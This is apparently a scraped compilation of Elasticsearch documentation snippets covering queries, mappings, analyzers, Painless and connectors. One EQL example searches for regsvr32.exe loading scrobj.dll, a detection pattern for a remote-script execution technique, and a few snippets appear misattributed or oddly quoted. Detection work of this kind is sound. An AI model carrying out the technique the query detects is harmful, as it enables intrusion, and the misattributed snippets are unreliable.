use of identity not equals operator with the 'def' type in Painless. It demonstrates reference type comparison within loosely typed variables. The expected output is a boolean based on reference inequality conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_28\n\nLANGUAGE: Painless\nCODE:\n```\ndef a = new HashMap();\ndef b = new ArrayList();\nboolean c = a !== b;\nb = a;\nc = a !== b;\n```\n\n----------------------------------------\n\nTITLE: Starting New Elasticsearch Instances from Custom Image on GCP\nDESCRIPTION: This snippet shows how to create new Elasticsearch instances using a custom image. It provides two examples: a simple instance creation and a more detailed one with specific machine type and scopes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-cloning.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\n# Just change node name (here myesnode2)\ngcloud compute instances create myesnode2 --image elasticsearch-2-0-0 --zone europe-west1-a\n\n# If you want to provide all details directly, you can use:\ngcloud compute instances create myesnode2 --image=elasticsearch-2-0-0 \\\n       --zone europe-west1-a --machine-type f1-micro --scopes=compute-rw\n```\n\n----------------------------------------\n\nTITLE: Calculating Minimum Value with MIN Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MIN function in ESQL to find the minimum value of the 'languages' field from the 'employees' table. The STATS command is used to perform the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/min.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MIN(languages)\n```\n\n----------------------------------------\n\nTITLE: Basic EQL Sequence Search in Elasticsearch\nDESCRIPTION: Performs a basic EQL sequence search for two ordered events: a process named 'regsvr32.exe' followed by a file operation involving 'scrobj.dll'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence\n      [ process where process.name == \"regsvr32.exe\" ]\n      [ file where stringContains(file.name, \"scrobj.dll\") ]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Runtime Field in Elasticsearch Search Request\nDESCRIPTION: Demonstrates how to create a runtime field within a search request for temporary use. The example includes an aggregation on the dynamically calculated day of week field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/use-painless-scripts-in-runtime-fields.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n  \"runtime_mappings\": {\n    \"day_of_week\": {\n      \"type\": \"keyword\",\n      \"script\": {\n        \"source\":\n        \"\"\"emit(doc['@timestamp'].value.dayOfWeekEnum\n        .getDisplayName(TextStyle.FULL, Locale.ROOT))\"\"\"\n      }\n    }\n  },\n  \"aggs\": {\n    \"day_of_week\": {\n      \"terms\": {\n        \"field\": \"day_of_week\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Simple ESQL FROM Query\nDESCRIPTION: Demonstrates a basic ESQL query using the FROM command to retrieve data from an 'employees' index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n```\n\n----------------------------------------\n\nTITLE: IFNULL Function\nDESCRIPTION: Two-argument variant of COALESCE that returns the second expression if the first is null, otherwise returns the first expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nIFNULL(\n    expression,\n    expression)\n```\n\n----------------------------------------\n\nTITLE: Filtering Aggregations with WHERE in ESQL STATS\nDESCRIPTION: Demonstrates how to use the WHERE clause to filter rows for specific aggregations in the STATS command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary = AVG(salary) WHERE gender = \"F\",\n  min_salary = MIN(salary),\n  max_salary = MAX(salary)\nBY department;\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Lowercase Tokenizer Usage in Elasticsearch\nDESCRIPTION: This example shows how to use the lowercase tokenizer in Elasticsearch's _analyze API. It processes a sample text that contains a mix of uppercase and lowercase letters, numbers, and punctuation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lowercase-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"lowercase\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing German Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in German analyzer with German stopwords, keyword marker for exclusions from stemming, German normalization, and light German stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nPUT /german_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"german_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_german_\" <1>\n        },\n        \"german_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"Beispiel\"] <2>\n        },\n        \"german_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"light_german\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_german\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"german_stop\",\n            \"german_keywords\",\n            \"german_normalization\",\n            \"german_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Result Document after Array Processing\nDESCRIPTION: The resulting document after the Foreach processor has applied the uppercase transformation to each element in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"values\" : [\"FOO\", \"BAR\", \"BAZ\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Indices with Different Numeric Types for Sorting in Elasticsearch\nDESCRIPTION: Defines two indices with different numeric types (double and long) to demonstrate type casting in sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT /index_double\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field\": { \"type\": \"double\" }\n    }\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT /index_long\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field\": { \"type\": \"long\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting WKT strings to cartesian_shape using TO_CARTESIANSHAPE in ESQL\nDESCRIPTION: This example demonstrates how to convert Well-Known Text (WKT) format strings into cartesian_shape values using the TO_CARTESIANSHAPE function. The snippet creates a row with an array of WKT strings, expands it, and then applies the conversion function to each value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_cartesianshape.md#2025-04-22_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = [\"POINT(4297.11 -1475.53)\", \"POLYGON ((3339584.72 1118889.97, 4452779.63 4865942.27, 2226389.81 4865942.27, 1113194.90 2273030.92, 3339584.72 1118889.97))\"] \n| MV_EXPAND wkt\n| EVAL geom = TO_CARTESIANSHAPE(wkt)\n```\n\n----------------------------------------\n\nTITLE: Skip Duplicate Suggestions in Elasticsearch Completion Suggester\nDESCRIPTION: Shows how to filter out duplicate suggestions from different documents in the results by setting the skip_duplicates parameter to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nPOST music/_search?pretty\n{\n  \"suggest\": {\n    \"song-suggest\": {\n      \"prefix\": \"nor\",\n      \"completion\": {\n        \"field\": \"suggest\",\n        \"skip_duplicates\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CONVERT Function in Elasticsearch SQL\nDESCRIPTION: The CONVERT function works like CAST but with different syntax. It supports standard data types as well as ODBC data types. It takes an expression to convert and a target data type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nCONVERT(\n    expression, <1>\n    data_type)  <2>\n```\n\n----------------------------------------\n\nTITLE: Initiating a Scroll Search in Elasticsearch\nDESCRIPTION: This snippet shows how to initiate a scroll search request in Elasticsearch. It specifies a scroll time of 1 minute and a query to match documents containing 'foo' in the message field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search?scroll=1m\n{\n  \"size\": 100,\n  \"query\": {\n    \"match\": {\n      \"message\": \"foo\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Simulating Date Index Name Pipeline in Elasticsearch\nDESCRIPTION: Example of using the _simulate API to preview how the date index name processor will transform a document without actually indexing it, useful for testing and debugging.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-index-name-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\" :\n  {\n    \"description\": \"monthly date-time index naming\",\n    \"processors\" : [\n      {\n        \"date_index_name\" : {\n          \"field\" : \"date1\",\n          \"index_name_prefix\" : \"my-index-\",\n          \"date_rounding\" : \"M\"\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"date1\": \"2016-04-25T12:02:01.789Z\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering for NULL Values in ESQL\nDESCRIPTION: This query selects employees from the 'employees' index where the birth_date field is NULL. The result shows three employees with their first and last names displayed in the output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/predicates.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE birth_date IS NULL\n```\n\n----------------------------------------\n\nTITLE: Case-Insensitive Wildcard Matching in Elasticsearch EQL\nDESCRIPTION: Demonstrates the use of 'like~' for case-insensitive wildcard matching in Elasticsearch EQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_33\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name like~ \"cmd*.exe\"\n```\n\n----------------------------------------\n\nTITLE: Parsing Date String to Date Object in ESQL\nDESCRIPTION: This snippet demonstrates how to use the DATE_PARSE function in ESQL to convert a string representation of a date into a date object. It takes two arguments: the date format string and the date string to be parsed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/date_parse.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW date_string = \"2022-05-06\"\n| EVAL date = DATE_PARSE(\"yyyy-MM-dd\", date_string)\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Hunspell Token Filter\nDESCRIPTION: Example of using the analyze API with Hunspell filter to stem English text using the en_US dictionary\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hunspell-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"hunspell\",\n      \"locale\": \"en_US\"\n    }\n  ],\n  \"text\": \"the foxes jumping quickly\"\n}\n```\n\n----------------------------------------\n\nTITLE: Sparse Vector Query with Precomputed Vectors\nDESCRIPTION: Shows how to perform a sparse vector query using precalculated token-weight pairs, bypassing additional inference\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-sparse-vector-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n   \"query\":{\n      \"sparse_vector\": {\n        \"field\": \"ml.tokens\",\n        \"query_vector\": { \"token1\": 0.5, \"token2\": 0.3, \"token3\": 0.2 }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Zero Terms Query Behavior\nDESCRIPTION: This snippet outlines how to configure the zero_terms_query parameter, enabling the query to return all documents instead of none if the analyzer removes all tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": {\n        \"query\": \"to be or not to be\",\n        \"operator\": \"and\",\n        \"zero_terms_query\": \"all\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Example of VAR_POP Function Usage\nDESCRIPTION: This example SQL query retrieves the minimum salary, maximum salary, and the population variance of salaries from the 'emp' table using the VAR_POP function. The result displays these three calculated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_22\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary) AS min, MAX(salary) AS max, VAR_POP(salary) AS varpop FROM emp;\n\n      min      |      max      |     varpop\n---------------+---------------+----------------\n25324          |74999          |1.894786801075E8\n```\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Normalizer in Elasticsearch Using JSON\nDESCRIPTION: This snippet defines a custom normalizer named 'my_normalizer' for an Elasticsearch index. It specifies a character filter for mapping quote characters and uses built-in filters for lowercase conversion and ASCII folding.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/normalizers.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT index\n{\n  \"settings\": {\n    \"analysis\": {\n      \"char_filter\": {\n        \"quote\": {\n          \"type\": \"mapping\",\n          \"mappings\": [\n            \"« => \\\"\",\n            \"» => \\\"\"\n          ]\n        }\n      },\n      \"normalizer\": {\n        \"my_normalizer\": {\n          \"type\": \"custom\",\n          \"char_filter\": [\"quote\"],\n          \"filter\": [\"lowercase\", \"asciifolding\"]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"foo\": {\n        \"type\": \"keyword\",\n        \"normalizer\": \"my_normalizer\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_ADD Example: Add Weeks\nDESCRIPTION: Illustrates the usage of DATE_ADD to add 10 weeks to a datetime value. This SQL example shows how to increment a date by a specific number of weeks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_23\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_ADD('week', 10, '2019-09-04T11:22:33.000Z'::datetime) AS \\\"+10 weeks\\\";\\n\\n      +10 weeks\n------------------------\n2019-11-13T11:22:33.000Z\"\n```\n\n----------------------------------------\n\nTITLE: Complex GROK Pattern with Multiple Fields in ESQL\nDESCRIPTION: Demonstrates parsing a string containing timestamp, IP address, email, and number using GROK.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_13\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42\"\n| GROK a \"\"\"%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num}\"\"\"\n| KEEP date, ip, email, num\n```\n\n----------------------------------------\n\nTITLE: Configuring Index Mapping for Highlighting Using Term Vectors\nDESCRIPTION: This snippet demonstrates how to configure the 'comment' field in an index mapping to enable highlighting using term vectors by setting 'term_vector' to 'with_positions_offsets', which increases index size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_24\n\nLANGUAGE: console\nCODE:\n```\nPUT /example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comment\" : {\n        \"type\": \"text\",\n        \"term_vector\" : \"with_positions_offsets\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Properties Mapping in Elasticsearch\nDESCRIPTION: Demonstrates how to create an index with explicit property mappings for both object and nested fields. The example includes a manager object field and a nested employees field, each with age and name properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/properties.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"manager\": {\n        \"properties\": {\n          \"age\":  { \"type\": \"integer\" },\n          \"name\": { \"type\": \"text\"  }\n        }\n      },\n      \"employees\": {\n        \"type\": \"nested\",\n        \"properties\": {\n          \"age\":  { \"type\": \"integer\" },\n          \"name\": { \"type\": \"text\"  }\n        }\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"region\": \"US\",\n  \"manager\": {\n    \"name\": \"Alice White\",\n    \"age\": 30\n  },\n  \"employees\": [\n    {\n      \"name\": \"John Smith\",\n      \"age\": 34\n    },\n    {\n      \"name\": \"Peter Brown\",\n      \"age\": 26\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing text with Porter stem filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the Porter stem filter in an Elasticsearch analyze API request. It stems the input text 'the foxes jumping quickly' to produce stemmed tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-porterstem-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [ \"porter_stem\" ],\n  \"text\": \"the foxes jumping quickly\"\n}\n```\n\n----------------------------------------\n\nTITLE: Querying IPv6 Addresses Using CIDR Notation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a term query on an IP field using CIDR notation for IPv6 addresses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ip.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"ip_addr\": \"2001:db8::/48\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Rate Aggregation Structure\nDESCRIPTION: Shows the basic syntax for a rate aggregation that calculates rates based on a requests field with monthly units.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"rate\": {\n    \"unit\": \"month\",\n    \"field\": \"requests\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IllegalThreadStateException in Java\nDESCRIPTION: This snippet defines the java.lang.IllegalThreadStateException class, thrown to indicate that a method has been called at an illegal or inappropriate time. Typically thrown when trying to start a thread more than once. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_38\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.IllegalThreadStateException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Random Circles for Elasticsearch Geo Testing in Java\nDESCRIPTION: This method generates a random circle for geospatial testing in Elasticsearch. It creates a circle with a random center point and radius, ensuring the radius is within a specified range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/arrow/licenses/checker-qual-NOTICE.txt#2025-04-22_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\npublic static Circle randomCircle(Point... centerPoint) {\n    Point center = centerPoint.length > 0 ? centerPoint[0] : randomPoint();\n    return new Circle(center, OpenSearchTestCase.randomDouble() * 100);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating GCE Instance with Tags for Elasticsearch Discovery\nDESCRIPTION: A shell command for creating a Google Compute Engine instance with specific tags that can be used for Elasticsearch node discovery filtering. The command creates an instance named 'myesnode1' with the compute-rw scope and the tags 'elasticsearch' and 'dev'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-tags.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ngcloud compute instances create myesnode1 --project=es-cloud \\\n       --scopes=compute-rw \\\n       --tags=elasticsearch,dev\n```\n\n----------------------------------------\n\nTITLE: Running Self-Hosted Extraction Service with Docker\nDESCRIPTION: Command to run the self-hosted content extraction service using Docker. This service handles extraction for files larger than 10MB for self-managed connectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ docker run \\\n  -p 8090:8090 \\\n  -it \\\n  --name extraction-service \\\n  docker.elastic.co/integrations/data-extraction-service:$EXTRACTION_SERVICE_VERSION\n```\n\n----------------------------------------\n\nTITLE: Creating Microsoft Teams Connector using API - Elasticsearch API\nDESCRIPTION: This code snippet demonstrates how to create a new self-managed Microsoft Teams connector using the Elasticsearch Create Connector API. Required parameters include the index name, connector name, and service type. The expected input is a JSON body with these details, and successful execution results in the creation of the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-teams.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-microsoft_teams-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Microsoft Teams\",\n  \"service_type\": \"microsoft_teams\"\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents for Terms Lookup\nDESCRIPTION: Shows how to index multiple documents with color values for terms lookup demonstration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"color\":   [\"blue\", \"green\"]\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/2\n{\n  \"color\":   \"blue\"\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT GeometryCollection in Elasticsearch\nDESCRIPTION: Example of indexing a Well-Known Text (WKT) GeometryCollection in Elasticsearch. This represents the same geometry as the GeoJSON example but using WKT syntax, combining a Point and a LineString.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_17\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"GEOMETRYCOLLECTION (POINT (100.0 0.0), LINESTRING (101.0 0.0, 102.0 1.0))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Fields Dynamically to an Elasticsearch Index\nDESCRIPTION: This snippet demonstrates adding a document with new fields to an index, causing Elasticsearch to dynamically create mappings for these fields. It shows adding a string field 'username' and an object field 'name' with nested fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dynamic.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"username\": \"johnsmith\",\n  \"name\": { <1>\n    \"first\": \"John\",\n    \"last\": \"Smith\"\n  }\n}\n\nGET my-index-000001/_mapping <2>\n```\n\n----------------------------------------\n\nTITLE: Rounding Decimal Number in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the ROUND function in ESQL. It rounds the decimal number 1.23 to 0 decimal places and assigns the result to a variable named 'a'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/row.csv-spec/function.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = ROUND(1.23, 0)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Escaped Characters in Regular Expressions\nDESCRIPTION: Examples showing how to escape reserved characters in regular expressions with backslashes or double quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n\\@                  # renders as a literal '@'\n\\\\                  # renders as a literal '\\'\n\"john@smith.com\"    # renders as 'john@smith.com'\n```\n\n----------------------------------------\n\nTITLE: Defining OffsetTime Class\nDESCRIPTION: This code snippet defines the `java.time.OffsetTime` class, including its methods. The class represents a time with an offset from UTC/Greenwich in the ISO-8601 calendar system, such as 10:15:30+01:00. These methods cover creation, manipulation, and accessing components of the date/time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.OffsetTime {\\n  OffsetTime MAX\\n  OffsetTime MIN\\n  int compareTo(OffsetTime)\\n  String format(DateTimeFormatter)\\n  OffsetTime from(TemporalAccessor)\\n  int getHour()\\n  int getMinute()\\n  ZoneOffset getOffset()\\n  int getSecond()\\n  int getNano()\\n  boolean isAfter(OffsetTime)\\n  boolean isBefore(OffsetTime)\\n  boolean isEqual(OffsetTime)\\n  OffsetTime of(LocalTime,ZoneOffset)\\n  OffsetTime of(int,int,int,int,ZoneOffset)\\n  OffsetTime ofInstant(Instant,ZoneId)\\n  OffsetTime plus(TemporalAmount)\\n  OffsetTime plus(long,TemporalUnit)\\n  OffsetTime plusHours(long)\\n  OffsetTime plusMinutes(long)\\n  OffsetTime plusSeconds(long)\\n  OffsetTime plusNanos(long)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Initializing Search Application Client with API Key\nDESCRIPTION: Code snippet demonstrating how to initialize the Search Application client with the generated API key. This client is used in frontend applications to securely query Elasticsearch Search Applications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst client = SearchApplicationClient(applicationName, endpoint, apiKey, params);\n```\n\n----------------------------------------\n\nTITLE: Using Date Math in Search Requests across Multiple Indices in Elasticsearch\nDESCRIPTION: Example of using date math expressions to search across multiple Logstash indices for the past three days. This allows limiting searches to a specific time range without having to specify each index explicitly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n# GET /<logstash-{now/d-2d}>,<logstash-{now/d-1d}>,<logstash-{now/d}>/_search\nGET /%3Clogstash-%7Bnow%2Fd-2d%7D%3E%2C%3Clogstash-%7Bnow%2Fd-1d%7D%3E%2C%3Clogstash-%7Bnow%2Fd%7D%3E/_search\n{\n  \"query\" : {\n    \"match\": {\n      \"test\": \"data\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Self-managed GitHub Connector with Elasticsearch API\nDESCRIPTION: Illustrates the creation of a new GitHub connector using the Elasticsearch API, specifying index name, service type, and other configuration parameters. Assumes access to the Elastic service with necessary API privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-github-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from GitHub\",\n  \"service_type\": \"github\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Numeric Type Combinations Table\nDESCRIPTION: A markdown table showing all possible combinations of numeric types (double, integer, long, unsigned_long) and their resulting output types in ESQL operations. All numeric type combinations result in a double type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/hypot.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number1 | number2 | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| double | unsigned_long | double |\n| integer | double | double |\n| integer | integer | double |\n| integer | long | double |\n| integer | unsigned_long | double |\n| long | double | double |\n| long | integer | double |\n| long | long | double |\n| long | unsigned_long | double |\n| unsigned_long | double | double |\n| unsigned_long | integer | double |\n| unsigned_long | long | double |\n| unsigned_long | unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Indexing Geohex Document with Ingest Pipeline in Elasticsearch\nDESCRIPTION: Indexes a document with a geohex (H3) value using the 'geohex2shape' pipeline, converting it to a WKT polygon.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT geocells/_doc/1?pipeline=geohex2shape\n{\n  \"geocell\": \"811fbffffffffff\"\n}\n\nGET geocells/_doc/1\n```\n\n----------------------------------------\n\nTITLE: Reference Types Equality Not Equals Examples\nDESCRIPTION: Illustrates equality not equals operations with 